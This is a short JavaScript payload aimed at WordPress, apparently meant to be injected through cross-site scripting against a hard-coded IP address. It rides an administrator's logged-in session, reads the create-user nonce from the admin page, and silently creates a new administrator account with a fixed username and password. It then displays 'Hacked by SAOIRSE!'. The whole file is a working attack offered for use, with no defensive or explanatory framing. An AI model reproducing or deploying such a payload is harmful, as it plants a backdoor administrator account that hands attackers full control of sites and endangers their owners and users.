const origin = "http://77.238.121.150:8000;
//const origin = "http://localhost:8000";

var xhr = new XMLHttpRequest();
xhr.open("GET", origin + '/wp-admin/user-new.php');
xhr.setRequestHeader("Referer", origin + "/wp-admin/user-new.php")
xhr.responseType = "document"
xhr.withCredentials = true;
xhr.onreadystatechange = function () {
    if (this.readyState === XMLHttpRequest.DONE) {
        var param4 = 'action=createuser&_wpnonce_create-user=' + this.responseXML.getElementById('_wpnonce_create-user').value + '&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=sa&email=dummy%40email.com&first_name=&last_name=&url=&pass1=12345*abcde&pass2=12345*abcde&role=administrator&createuser=Add+New+User';
        // Add admin
        var xhr = new XMLHttpRequest();
        xhr.open("POST", origin + '/wp-admin/user-new.php');
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.withCredentials = true;
        xhr.onreadystatechange = function () {
            if (this.readyState === XMLHttpRequest.DONE) {
                alert("Hacked by SAOIRSE!")
            }
        };
        xhr.send(param4);
    }
};
xhr.send();